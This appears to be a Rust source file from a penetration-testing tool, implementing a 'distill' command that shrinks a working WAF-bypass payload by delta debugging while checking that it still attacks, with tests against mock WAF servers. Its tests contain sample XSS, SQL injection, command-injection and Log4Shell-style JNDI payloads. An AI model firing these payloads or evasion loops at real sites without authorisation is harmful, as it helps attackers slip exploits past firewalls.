//! `wafrift distill` — adversarial distillation via Zeller's ddmin.
//!
//! Given a KNOWN-working bypass payload, find the minimum-edit-
//! distance subset that STILL bypasses AND is still a working attack.
//! Output: a smaller, cleaner payload for pentest reports + a clearer
//! signal of which payload features the WAF actually objected to (vs.
//! which were noise).
//!
//! ## Algorithm
//!
//! Standard ddmin (Zeller 2002 — "Yesterday, my program worked.
//! Today, it does not. Why?"). The "still interesting" predicate is a
//! CONJUNCTION:
//!
//! 1. **Attack preserved** — the candidate still carries the attack
//!    class (checked locally by the matching [`wafrift_oracle`]
//!    semantic oracle, e.g. the reduced payload still parses to an
//!    executable XSS vector / a valid SQL injection). This clause is
//!    what makes distillation USEFUL: without it, ddmin happily
//!    shrinks `<svg onload=alert(1)>` down to a single benign byte
//!    that "passes" the WAF but no longer attacks anything.
//! 2. **Still bypasses** — the candidate still gets through the WAF
//!    (one HTTP fire).
//!
//! The semantic clause runs FIRST and in-process, so a candidate that
//! has lost the attack is rejected without spending an HTTP fire —
//! correctness and stealth (fewer requests at a rate-limited target)
//! in one. `--class` overrides the auto-detected class; `--class none`
//! disables the gate (WAF-bypass only — the result may not still
//! attack, and the output says so).
//!
//! 1. Split the input into `n` chunks (`n = 2` to start).
//! 2. **Subset pass:** try each chunk in isolation. If any single
//!    chunk still bypasses, recurse with that chunk + reset `n = 2`.
//! 3. **Complement pass:** try removing each chunk (keep the rest).
//!    If any removal still bypasses, recurse with that complement +
//!    decrement `n`.
//! 4. If neither pass simplifies, double `n` and try again.
//! 5. Terminate when `n >= |input|` (each chunk is a single char and
//!    nothing reduces further).
//!
//! Worst-case fires: O(n²) in input length; typical: O(n log n).
//!
//! ## When to use
//!
//! Pentester workflow:
//! ```text
//! $ wafrift scan https://target/ --param q --payload "<long bypass>" --format json > scan.json
//! $ jq -r '.bypass_variants[0].payload' scan.json
//! "<long bypass that worked>"
//! $ wafrift distill https://target/ --param q --payload "<long bypass that worked>"
//! Original payload: <long...>
//! Distilled to:     <minimum form>
//! Result: N% reduction in M fires
//! ```
//!
//! The distilled payload goes into the finding write-up — shorter
//! payloads are easier for the client to reproduce and easier for
//! defenders to understand.

use std::process::ExitCode;
use std::sync::Arc;
use std::sync::atomic::{AtomicU32, Ordering};
use std::time::Duration;

use clap::Args;
use colored::Colorize;
use serde_json::json;
use tokio_util::sync::CancellationToken;
use wafrift_grammar::grammar;
use wafrift_transport::is_waf_block;

use crate::scan::scan_url_with_param;

#[derive(Args, Debug)]
pub(crate) struct DistillArgs {
    /// Target URL.
    #[arg(value_name = "URL")]
    pub target: String,

    /// Query parameter name to inject into.
    #[arg(long, default_value = "q")]
    pub param: String,

    /// The KNOWN-working bypass payload to distill. Typically the
    /// `bypass_variants[i].payload` field from
    /// `wafrift scan --format json` output. If this payload is NOT
    /// itself a bypass against the target, distill exits 2 — there
    /// is nothing meaningful to reduce.
    #[arg(long)]
    pub payload: String,

    /// Attack class used to keep distillation HONEST. ddmin only keeps a
    /// reduced payload that STILL carries this attack class (checked locally by
    /// the matching semantic oracle) AND still bypasses the WAF. Without it,
    /// ddmin would gladly shrink a working `<svg onload=alert(1)>` down to a
    /// single benign byte that "passes" the WAF but is no longer an attack — a
    /// useless distillation. `auto` (default) detects the class from the
    /// payload; override when auto-detection guesses wrong (e.g. heavily-encoded
    /// or mixed-class payloads). `none` disables the semantic gate (WAF-bypass
    /// only — the result may not be a working attack; review it by hand).
    #[arg(long, default_value = "auto",
          value_parser = ["auto", "none", "xss", "sql", "cmdi", "ssti", "path", "ldap", "ssrf", "nosql", "xxe", "log4shell", "cve_pocs"])]
    pub class: String,

    /// Output format. `text` (default) prints a short summary; `json`
    /// emits a structured blob for piping into report tooling.
    #[arg(long, default_value = "text", value_parser = ["text", "json"])]
    pub format: String,

    /// Inter-fire delay (ms) — useful when distilling against
    /// rate-limited targets.
    #[arg(long, default_value_t = 0)]
    pub delay_ms: u64,

    /// Accept self-signed TLS certificates. Mirrors `wafrift scan
    /// --insecure`.
    #[arg(long, default_value_t = false)]
    pub insecure: bool,

    /// HTTP proxy to route every fire through (Burp on
    /// `http://127.0.0.1:8080` is the canonical setup). Same shape
    /// as `wafrift scan --proxy`.
    #[arg(long, value_name = "URL")]
    pub proxy: Option<String>,

    /// Extra request headers (`-H 'Name: Value'`, repeatable). Same
    /// shape as `wafrift scan -H`.
    #[arg(long, short = 'H', value_name = "HEADER", num_args = 0..)]
    pub header: Vec<String>,

    /// Maximum HTTP fires the distillation is allowed to make
    /// before stopping. Defence against pathological inputs +
    /// rate-limiting WAFs that could otherwise run forever.
    /// Default 500 — generous for any human-written payload.
    #[arg(long, default_value_t = 500)]
    pub max_fires: u32,

    /// Per-request HTTP timeout (seconds). 0 = use workspace default
    /// (`DEFAULT_REQUEST_TIMEOUT_SECS`). R55 pass-18 I1 (CLAUDE.md
    /// §9 WIRING): mirrors every other subcommand's `--timeout-secs`
    /// so `.wafrift.toml`'s `http.timeout_secs` applies here too.
    #[arg(long, default_value_t = 0)]
    pub timeout_secs: u64,
}

/// Entry point — dispatched from `main::Commands::Distill`.
pub(crate) async fn run_distill(mut args: DistillArgs, cancel: CancellationToken) -> ExitCode {
    args.target = crate::helpers::normalize_target_url(&args.target);
    if args.payload.is_empty() {
        eprintln!(
            "{} --payload must not be empty",
            "Input error:".red().bold()
        );
        return ExitCode::from(2);
    }

    let http = match build_http_client(&args) {
        Ok(c) => c,
        Err(code) => return code,
    };

    // Baseline: the input payload must itself bypass. Otherwise
    // distillation has no meaning — there's no "still bypasses"
    // property to preserve.
    match fire_and_check(&http, &args.target, &args.param, &args.payload).await {
        Ok(true) => {
            eprintln!(
                "{} input payload confirmed as a bypass against {} — distilling…",
                "[wafrift distill]".bright_cyan().bold(),
                args.target.bright_white()
            );
        }
        Ok(false) => {
            eprintln!(
                "{} --payload was BLOCKED by the target — nothing to distill. \
                 The input payload must actually bypass the WAF before \
                 distillation has meaning. Run `wafrift scan` first; pick a \
                 payload from `bypass_variants[i].payload`.",
                "Input error:".red().bold()
            );
            return ExitCode::from(2);
        }
        Err(e) => {
            eprintln!(
                "{} baseline probe failed: {e}",
                "Transport error:".red().bold()
            );
            return ExitCode::from(1);
        }
    }

    // Resolve the attack class for the semantic gate. This is what keeps
    // distillation honest: ddmin's predicate is the CONJUNCTION
    //   "candidate still carries the SAME attack as the original"  AND  "still bypasses"
    // not just "still bypasses". Without the first clause ddmin gladly shrinks a
    // working `<svg onload=alert(1)>` to a single benign byte that the WAF passes
    // but that no longer attacks anything — a useless distillation.
    //
    // The gate is `equiv_engine::oracle_valid` — the EXACT same canonical,
    // same-exploit-preserving check `bench`/`scan` apply, so a distilled payload
    // is sound by the identical standard (e.g. a UNION-exfil SQLi can't be reduced
    // to a weaker boolean tautology that merely "parses as SQL"). distill operates
    // on the literal payload (the ddmin candidate IS the effective form — no
    // transport-encoding layer between it and the gate), so `oracle_valid(class,
    // original, candidate)` is exactly the right question here.
    let class: Option<String> = match args.class.as_str() {
        "none" => None,
        "auto" => crate::equiv_engine::class_for_payload_type(grammar::classify(&args.payload))
            .map(str::to_string),
        other => Some(other.to_string()),
    };
    // Robustness: if the gate can't even confirm the INPUT is a valid attack of
    // its class (mis-detection, or no oracle for the class), it would reject the
    // full input and ddmin would have no consistent starting point. Fall back to
    // WAF-bypass-only with a loud warning rather than silently producing nonsense.
    let class: Option<String> = match class {
        Some(c) if crate::equiv_engine::oracle_valid(&c, &args.payload, &args.payload) => Some(c),
        Some(c) => {
            eprintln!(
                "{} the {c} oracle does not recognise the input as a valid attack of that \
                 class — distilling on WAF-bypass ALONE (the minimal form may not be a working \
                 attack; pass --class to force the right oracle).",
                "[wafrift distill] warning:".yellow().bold(),
            );
            None
        }
        None if args.class != "none" => {
            eprintln!(
                "{} no semantic oracle for the detected class — distilling on WAF-bypass ALONE. \
                 The minimal payload may no longer be a working attack; review it by hand.",
                "[wafrift distill] warning:".yellow().bold(),
            );
            None
        }
        None => None,
    };
    let semantic_gate = class.is_some();
    let class_label = class.clone().unwrap_or_else(|| "none".to_string());

    let fires = Arc::new(AtomicU32::new(1)); // baseline already fired.
    let max_fires = args.max_fires;
    let target = args.target.clone();
    let param = args.param.clone();
    let delay = Duration::from_millis(args.delay_ms);
    let http_arc = Arc::new(http);
    let original_payload = args.payload.clone();

    let predicate = {
        let http_arc = http_arc.clone();
        let fires = fires.clone();
        let cancel = cancel.clone();
        move |candidate: String| {
            // Semantic gate FIRST, synchronously in the closure body: a candidate
            // that no longer carries the attack is rejected here, before any HTTP
            // fire — so a dead candidate costs zero requests against the (often
            // rate-limited) target.
            let attack_preserved = match class.as_deref() {
                Some(c) => crate::equiv_engine::oracle_valid(c, &original_payload, &candidate),
                None => true,
            };
            let http = http_arc.clone();
            let target = target.clone();
            let param = param.clone();
            let fires = fires.clone();
            let cancel = cancel.clone();
            async move {
                if !attack_preserved {
                    return false;
                }
                if cancel.is_cancelled() {
                    return false;
                }
                let cur = fires.fetch_add(1, Ordering::SeqCst);
                if cur >= max_fires {
                    return false;
                }
                if !delay.is_zero() {
                    tokio::time::sleep(delay).await;
                }
                fire_and_check(&http, &target, &param, &candidate)
                    .await
                    .unwrap_or(false)
            }
        }
    };

    let minimum = ddmin(&args.payload, predicate).await;

    let original_len = args.payload.chars().count();
    let min_len = minimum.chars().count();
    let reduction_pct = if original_len > 0 {
        ((original_len - min_len) as f64 / original_len as f64) * 100.0
    } else {
        0.0
    };
    let fires_made = fires.load(Ordering::SeqCst);
    let fires_capped = fires_made >= max_fires;

    if args.format == "json" {
        let out = json!({
            "target": args.target,
            "param": args.param,
            "original": {
                "payload": args.payload,
                "length": original_len,
            },
            "minimal": {
                "payload": minimum,
                "length": min_len,
            },
            "reduction_pct": reduction_pct,
            "fires": fires_made,
            "fires_capped": fires_capped,
            "attack_class": class_label,
            // true ⇒ the minimal payload is guaranteed to STILL carry the same
            // attack as the original (the canonical oracle gated every reduction).
            // false ⇒ WAF-bypass only — the minimal form may no longer be a
            // working attack; review by hand.
            "semantic_preservation": semantic_gate,
        });
        match serde_json::to_string_pretty(&out) {
            Ok(s) => println!("{s}"),
            Err(e) => {
                eprintln!("JSON serialize error: {e}");
                return ExitCode::from(1);
            }
        }
    } else {
        println!();
        println!("  {} {}", "Original payload:".bold(), args.payload.yellow());
        println!("  {} {} chars", "Length:".bold(), original_len);
        println!();
        println!(
            "  {} {}",
            "Distilled to:".bold().bright_green(),
            minimum.bright_green().bold()
        );
        println!("  {} {} chars", "Length:".bold(), min_len);
        println!();
        println!(
            "  {} {:.1}% reduction in {} fires{}",
            "Result:".bold().cyan(),
            reduction_pct,
            fires_made,
            if fires_capped {
                " (capped — increase --max-fires for tighter distillation)"
                    .bright_black()
                    .to_string()
            } else {
                String::new()
            }
        );
        if semantic_gate {
            println!(
                "  {} every reduction kept a valid {} attack — the minimal payload still fires.",
                "Verified:".bold().green(),
                class_label.bright_white()
            );
        } else {
            println!(
                "  {} WAF-bypass only (no class oracle) — confirm the minimal payload still attacks.",
                "Caveat:".bold().yellow()
            );
        }
    }

    ExitCode::SUCCESS
}

/// Zeller's ddmin algorithm — find the minimum input subset for
/// which `test` returns true. Returns the original input unchanged
/// when no proper subset satisfies the predicate.
///
/// Generic over an async predicate so callers can fire HTTP
/// requests (or any other async test) inside.
///
/// # Invariants
/// - Returns a string whose char count is ≤ the input's.
/// - If `test(input)` is true, the returned string also makes
///   `test` return true (by induction over the reduction steps).
/// - If `test` is constant-true, returns a single-char string.
pub(crate) async fn ddmin<F, Fut>(input: &str, test: F) -> String
where
    F: Fn(String) -> Fut,
    Fut: std::future::Future<Output = bool>,
{
    let chars: Vec<char> = input.chars().collect();
    if chars.len() <= 1 {
        return chars.iter().collect();
    }

    let mut current = chars;
    let mut n: usize = 2;

    loop {
        // Cannot reduce a single-element input further. Without this
        // explicit early-out, the subset pass below could re-accept
        // a candidate equal to `current` (when chunk_size == len)
        // and spin forever.
        if current.len() <= 1 {
            break;
        }
        let chunk_size = current.len().div_ceil(n).max(1);
        let mut reduced = false;

        // 1) Subset pass — try each chunk in isolation. Only accept
        // candidates STRICTLY SHORTER than current; anything else
        // is not a reduction. `n` is mutated inside the loop body
        // but every mutation is followed by `break`, so the
        // range-bound clippy warning is a false positive.
        #[allow(clippy::mut_range_bound)]
        for i in 0..n {
            let start = i * chunk_size;
            if start >= current.len() {
                break;
            }
            let end = (start + chunk_size).min(current.len());
            let candidate: Vec<char> = current[start..end].to_vec();
            if candidate.is_empty() || candidate.len() >= current.len() {
                continue;
            }
            let s: String = candidate.iter().collect();
            if test(s).await {
                current = candidate;
                n = 2;
                reduced = true;
                break;
            }
        }
        if reduced {
            continue;
        }

        // 2) Complement pass — try removing each chunk. Always
        // strictly shorter as long as the chunk is non-empty.
        // Same break-after-mutation pattern as pass 1.
        #[allow(clippy::mut_range_bound)]
        for i in 0..n {
            let start = i * chunk_size;
            if start >= current.len() {
                break;
            }
            let end = (start + chunk_size).min(current.len());
            if end <= start {
                continue;
            }
            let mut candidate: Vec<char> = current.clone();
            candidate.drain(start..end);
            if candidate.is_empty() || candidate.len() >= current.len() {
                continue;
            }
            let s: String = candidate.iter().collect();
            if test(s).await {
                current = candidate;
                n = n.saturating_sub(1).max(2);
                reduced = true;
                break;
            }
        }
        if reduced {
            continue;
        }

        // 3) Increase granularity. Terminate when each chunk is a
        // single char (n == |current|) and nothing reduces.
        if n >= current.len() {
            break;
        }
        n = (n * 2).min(current.len());
    }

    current.iter().collect()
}

/// Fire one candidate at the target and return `Ok(true)` iff the
/// response was NOT recognised as a WAF block. Encoding mirrors
/// `scan_url_with_param`'s caller convention.
async fn fire_and_check(
    http: &reqwest::Client,
    target: &str,
    param: &str,
    payload: &str,
) -> Result<bool, String> {
    let url = scan_url_with_param(target, param, &urlencoding_encode(payload));
    let resp = http.get(&url).send().await.map_err(|e| format!("{e}"))?;
    let status = resp.status().as_u16();
    // §15 OOM / decompression-bomb: cap the body read.
    let body = crate::safe_body::read_bounded(resp, crate::safe_body::DEFAULT_MAX_RESPONSE_BYTES)
        .await
        .map_err(|e| format!("{e}"))?;
    Ok(!is_waf_block(status, &body))
}

/// RFC 3986 unreserved-set urlencoding. Used to pass the candidate
/// payload through scan_url_with_param without it being interpreted
/// as URL syntax (`?`, `&`, `=`, etc.).
fn urlencoding_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char);
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}

fn build_http_client(args: &DistillArgs) -> Result<reqwest::Client, ExitCode> {
    let timeout = if args.timeout_secs > 0 {
        args.timeout_secs
    } else {
        wafrift_types::DEFAULT_REQUEST_TIMEOUT_SECS
    };
    crate::parser_diff_common::build_diff_http_client(
        timeout,
        args.insecure,
        args.proxy.as_deref(),
        &args.header,
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── ddmin algorithm correctness (pure, no HTTP) ──────────

    #[tokio::test]
    async fn ddmin_returns_input_unchanged_when_only_full_input_satisfies() {
        let result = ddmin("abc", |s| async move { s == "abc" }).await;
        assert_eq!(result, "abc");
    }

    #[tokio::test]
    async fn ddmin_reduces_to_single_required_byte() {
        // Predicate: candidate contains 'X'.
        let result = ddmin("aXbcdef", |s| async move { s.contains('X') }).await;
        assert_eq!(
            result, "X",
            "ddmin must reduce to the single load-bearing char"
        );
    }

    #[tokio::test]
    async fn ddmin_reduces_to_both_load_bearing_chars_when_test_requires_both() {
        // Predicate: must contain BOTH 'X' AND 'Y'.
        let result = ddmin(
            "aXbcdYef",
            |s| async move { s.contains('X') && s.contains('Y') },
        )
        .await;
        // Should reduce to the minimum subset that contains both —
        // 'XY' or 'XbcdY' or shorter. Both load-bearing chars must
        // survive.
        assert!(
            result.contains('X') && result.contains('Y'),
            "both X and Y must survive: got {result:?}"
        );
        // And the result should be SHORTER than the input.
        assert!(
            result.len() < "aXbcdYef".len(),
            "result must be shorter than input: got {result:?}"
        );
    }

    #[tokio::test]
    async fn ddmin_returns_input_when_test_constant_false() {
        // No subset satisfies. ddmin returns the input unchanged
        // because no reduction is valid.
        let result = ddmin("abc", |_s| async move { false }).await;
        assert_eq!(result, "abc");
    }

    #[tokio::test]
    async fn ddmin_handles_single_char_input_trivially() {
        let result = ddmin("a", |s| async move { !s.is_empty() }).await;
        assert_eq!(result, "a");
    }

    // ── Attack-preservation gate (the distill correctness fix) ───────────────
    //
    // distill's real predicate is the CONJUNCTION "still a valid attack of its
    // class" AND "still bypasses the WAF". These tests pin that the attack-
    // preservation clause stops ddmin shrinking a working payload into a benign
    // byte that merely passes the filter. They model the WAF as "passes
    // everything" (constant-true) — the worst case, where ONLY the semantic
    // oracle constrains the reduction.

    #[tokio::test]
    async fn semantic_gate_keeps_a_valid_xss_attack_through_ddmin() {
        use crate::equiv_engine::oracle_valid;

        let original = "<svg onload=alert(1)>";
        assert!(
            oracle_valid("xss", original, original),
            "precondition: the canonical gate must accept the full input"
        );

        let orig = original.to_string();
        // Mirror the production structure: the sync semantic gate runs in the
        // closure body, the future just yields the resulting bool. The WAF is
        // modelled as "passes everything" (the worst case for collapse).
        let result = ddmin(original, move |cand: String| {
            let ok = oracle_valid("xss", &orig, &cand);
            async move { ok }
        })
        .await;

        assert!(
            oracle_valid("xss", original, &result),
            "the distilled payload must STILL be a valid XSS attack, got {result:?}"
        );
        assert!(
            result.chars().count() > 1,
            "the gate must prevent collapse to a single benign byte, got {result:?}"
        );
    }

    #[tokio::test]
    async fn without_the_semantic_gate_ddmin_collapses_to_noise() {
        use crate::equiv_engine::oracle_valid;

        // The OLD (buggy) distill predicate: "WAF passes" ALONE, modelled as
        // constant-true. With nothing preserving the attack, ddmin shrinks a
        // working XSS vector to a single byte — the exact failure the gate fixes.
        let original = "<svg onload=alert(1)>";
        let result = ddmin(original, |_c| async move { true }).await;
        assert_eq!(
            result.chars().count(),
            1,
            "WAF-only ddmin collapses to one char, got {result:?}"
        );
        assert!(
            !oracle_valid("xss", original, &result),
            "the collapsed payload is no longer an attack — this is WHY the gate exists"
        );
    }

    #[tokio::test]
    async fn semantic_gate_preserves_sql_injection_through_ddmin() {
        use crate::equiv_engine::oracle_valid;

        // The canonical SQL gate is SAME-EXPLOIT-preserving (`still_executes` +
        // valid-injection parse), so the distilled form must remain the same
        // attack, not merely "some valid SQL".
        let original = "1 OR 1=1 -- ";
        assert!(
            oracle_valid("sql", original, original),
            "precondition: the canonical gate must accept the full input"
        );

        let orig = original.to_string();
        let result = ddmin(original, move |cand: String| {
            let ok = oracle_valid("sql", &orig, &cand);
            async move { ok }
        })
        .await;

        assert!(
            oracle_valid("sql", original, &result),
            "the distilled payload must STILL be a valid SQL injection, got {result:?}"
        );
    }

    #[test]
    fn distill_class_resolution_matches_the_canonical_gate() {
        use crate::equiv_engine::{class_for_payload_type, oracle_valid};
        use wafrift_grammar::grammar::PayloadType;

        // `auto` resolves through the SAME PayloadType→class mapping bench/scan
        // use — distill is wired to the one canonical gate, not a private copy.
        assert_eq!(class_for_payload_type(PayloadType::Xss), Some("xss"));
        assert_eq!(class_for_payload_type(PayloadType::Sql), Some("sql"));
        assert_eq!(
            class_for_payload_type(PayloadType::CommandInjection),
            Some("cmdi")
        );

        // The structural-class gates are live — they reject an obvious non-attack,
        // so a `--class` override never silently disables the gate for them.
        assert!(!oracle_valid("xss", "<svg onload=alert(1)>", "hello world"));
        assert!(!oracle_valid("sql", "1 OR 1=1", ")) not sql at all (("));
        assert!(!oracle_valid("cmdi", ";id", "harmless plain text"));

        // cve_pocs has no per-CVE oracle, so the gate validates ONLY intact
        // transmission (anti-rig, LAW 1): identity passes, any mutation is refused
        // — distilling a CVE PoC can therefore only ever return it unchanged.
        assert!(oracle_valid(
            "cve_pocs",
            "${jndi:ldap://x/a}",
            "${jndi:ldap://x/a}"
        ));
        assert!(!oracle_valid(
            "cve_pocs",
            "${jndi:ldap://x/a}",
            "${jndi:ldap://x/b}"
        ));
    }

    #[tokio::test]
    async fn ddmin_handles_empty_input_trivially() {
        let result = ddmin("", |_s| async move { false }).await;
        assert_eq!(result, "");
    }

    #[tokio::test]
    async fn ddmin_reduces_realistic_sql_payload_to_load_bearing_clause() {
        // Simulate a "the WAF sees 'OR 1=1' and blocks" scenario:
        // any payload CONTAINING 'OR 1=1' as a literal substring
        // "bypasses" (true in the predicate). Distillation should
        // peel off the surrounding noise.
        let payload = "/**/admin'/**/UNION/**/SELECT/**/1/**/FROM/**/users/**/WHERE/**/OR 1=1--";
        let result = ddmin(payload, |s| async move { s.contains("OR 1=1") }).await;
        assert!(result.contains("OR 1=1"), "got: {result:?}");
        // Should be MUCH shorter than the input.
        assert!(
            result.len() < payload.len() / 4,
            "result should be aggressively reduced: got {result:?} (len {})",
            result.len()
        );
    }

    #[tokio::test]
    async fn ddmin_call_count_is_bounded_polylog_for_simple_cases() {
        // Smoke test that ddmin doesn't blow up call count for a
        // single-byte requirement. Anti-rig against an
        // accidentally-quadratic implementation.
        let calls = Arc::new(AtomicU32::new(0));
        let calls_c = calls.clone();
        let _ = ddmin("abcdefghijklmnopqrstuvwxyz", move |s: String| {
            let calls = calls_c.clone();
            async move {
                calls.fetch_add(1, Ordering::SeqCst);
                s.contains('m')
            }
        })
        .await;
        let n = calls.load(Ordering::SeqCst);
        // 26-byte input, 1 load-bearing byte. ddmin in O(n log n)
        // should be well under 200 calls.
        assert!(n < 200, "expected < 200 calls, got {n}");
    }

    // ── Validation gates on the CLI wrapper ──────────────────

    fn args_minimal(target: &str, payload: &str) -> DistillArgs {
        DistillArgs {
            target: target.into(),
            param: "q".into(),
            payload: payload.into(),
            class: "auto".into(),
            format: "text".into(),
            delay_ms: 0,
            insecure: false,
            proxy: None,
            header: Vec::new(),
            max_fires: 500,
            timeout_secs: 0,
        }
    }

    #[tokio::test]
    async fn run_distill_rejects_empty_payload() {
        let args = args_minimal("http://127.0.0.1:65500", "");
        let cancel = CancellationToken::new();
        let code = run_distill(args, cancel).await;
        assert_eq!(
            format!("{code:?}"),
            format!("{:?}", ExitCode::from(2)),
            "empty payload must exit 2"
        );
    }

    // ── Live mock-WAF integration ────────────────────────────

    async fn spawn_mock_waf_blocking_on_substring(magic: &'static str) -> std::net::SocketAddr {
        use tokio::io::{AsyncReadExt, AsyncWriteExt};
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let Ok((mut sock, _)) = listener.accept().await else {
                    return;
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 16 * 1024];
                    let n = sock.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]);
                    let (status, body) = if req.contains(magic) {
                        ("403 Forbidden", "<html>blocked</html>".to_string())
                    } else {
                        ("200 OK", "<html>ok</html>".to_string())
                    };
                    let resp = format!(
                        "HTTP/1.1 {status}\r\nContent-Type: text/html\r\n\
                         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = sock.write_all(resp.as_bytes()).await;
                    let _ = sock.shutdown().await;
                });
            }
        });
        tokio::time::sleep(crate::parser_diff_common::TEST_SETTLE).await;
        addr
    }

    #[serial_test::serial]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn distill_rejects_when_input_payload_is_blocked_by_target() {
        // Mock blocks anything containing "FOO". Try to distill a
        // payload that contains "FOO" → baseline probe sees a block
        // → distill exits 2.
        let addr = spawn_mock_waf_blocking_on_substring("FOO").await;
        let args = args_minimal(&format!("http://{addr}/"), "abFOOcd");
        let cancel = CancellationToken::new();
        let code = run_distill(args, cancel).await;
        assert_eq!(
            format!("{code:?}"),
            format!("{:?}", ExitCode::from(2)),
            "non-bypassing payload must exit 2"
        );
    }

    #[serial_test::serial]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn distill_succeeds_when_input_payload_bypasses() {
        // Mock blocks on "BLOCK"; our input "abXYcd" doesn't contain
        // it → bypass → distill runs successfully.
        let addr = spawn_mock_waf_blocking_on_substring("BLOCK").await;
        let args = args_minimal(&format!("http://{addr}/"), "abXYcd");
        let cancel = CancellationToken::new();
        let code = run_distill(args, cancel).await;
        assert_eq!(
            format!("{code:?}"),
            format!("{:?}", ExitCode::SUCCESS),
            "bypassing payload must exit 0"
        );
    }

    #[serial_test::serial]
    #[tokio::test(flavor = "multi_thread", worker_threads = 2)]
    async fn distill_honors_cancel_token() {
        // Cancel before baseline fires — the baseline still runs
        // (so we can tell the operator their payload doesn't bypass),
        // but the ddmin loop should respect the cancel and not run.
        let addr = spawn_mock_waf_blocking_on_substring("never").await;
        let args = args_minimal(&format!("http://{addr}/"), "anything");
        let cancel = CancellationToken::new();
        cancel.cancel();
        let code = run_distill(args, cancel).await;
        // SUCCESS because baseline ran, distilled to no reduction.
        assert_eq!(format!("{code:?}"), format!("{:?}", ExitCode::SUCCESS));
    }

    // ── urlencoding_encode ────────────────────────────────────

    #[test]
    fn urlencoding_encode_passes_unreserved_chars_through() {
        assert_eq!(urlencoding_encode("AbZ0-9_.~"), "AbZ0-9_.~");
    }

    #[test]
    fn urlencoding_encode_percent_encodes_specials() {
        assert_eq!(urlencoding_encode(" "), "%20");
        assert_eq!(urlencoding_encode("'"), "%27");
        assert_eq!(urlencoding_encode("="), "%3D");
        assert_eq!(urlencoding_encode("&"), "%26");
    }
}
